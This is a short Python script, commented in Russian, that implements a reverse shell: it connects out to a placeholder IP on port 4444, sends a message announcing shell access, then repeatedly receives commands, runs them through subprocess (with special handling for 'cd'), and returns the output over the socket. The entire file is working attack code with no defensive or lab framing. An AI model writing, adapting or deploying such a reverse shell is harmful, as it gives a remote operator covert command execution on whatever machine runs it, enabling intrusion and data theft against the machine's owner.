import socket
import subprocess
import os

data = b''
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
connection.connect(("enter ip", 4444))  # поключаемся к определённому ip к 4444 порту
connection.send(b"you have access to shell")


def shell(command):  # функция, которая будет выполнять команды и возвращать результат
    # если длинна команды больше одного слова и начинается с 'cd'
    # то переходим по дирректории после "cd" и ответ будет равен директории, в которую мы перешли
    # а если длинна команды меньше или равно 1 слову или начинается не с 'cd' то просто получаем ответ
    # от коммандной строки и добавляем его в переменную, отвечающую за ответ и после чего возвращаем ответ
    if len(command.split()) > 1 and command.split()[0] == "cd":
        os.chdir(command.split()[1])
        call = command.split()[1]

    else:
        call = subprocess.getoutput(command)
    return call


while True:
    data = connection.recv(1024)  # принимаем данные от соединения
    # дешифруем их, обрезаем пробелы с начала и с конца и получаем ответ от терминала
    callback = shell(data.decode('utf8').strip()) + "\n"
    # отправляем полученный ответ в байтах(раньше можно было отправить строку, сейчас нельзя)
    connection.send(bytes(callback, encoding="utf8"))
